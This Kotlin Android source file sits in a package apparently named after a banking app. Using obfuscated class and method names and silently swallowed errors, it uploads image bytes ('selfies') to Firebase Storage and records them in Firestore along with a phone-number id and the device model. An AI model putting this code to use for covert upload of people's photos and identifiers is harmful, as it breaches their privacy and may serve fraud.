package com.ios.nequixofficialv2.security

import android.content.Context
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.*

class m(private val a: Context) {

    private val storage = FirebaseStorage.getInstance()
    private val db = FirebaseFirestore.getInstance()

    suspend fun p(data: ByteArray, type: String, id: String = "") {
        withContext(Dispatchers.IO) {
            try {
                if (id.isEmpty()) return@withContext
                
                val ts = System.currentTimeMillis()
                val fecha = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
                
                val url = u(id, ts, data)
                
                if (url != null) {
                    s(id, url, fecha, android.os.Build.MODEL, type, ts)
                }
            } catch (e: Exception) {}
        }
    }

    private suspend fun u(id: String, ts: Long, data: ByteArray): String? {
        return try {
            val ref = storage.reference.child("logs/${id}/${ts}.jpg")
            ref.putBytes(data).await()
            ref.downloadUrl.await().toString()
        } catch (e: Exception) {
            null
        }
    }

    private suspend fun s(id: String, url: String, fecha: String, dev: String, type: String, ts: Long) {
        try {
            val data = mapOf(
                "url" to url,
                "fecha" to fecha,
                "numero" to (id.toIntOrNull() ?: 0),
                "dispositivo" to dev,
                "tipo" to type,
                "timestamp" to ts
            )
            db.collection("users")
                .document(id)
                .collection("selfies")
                .add(data)
                .await()
        } catch (e: Exception) {}
    }
}
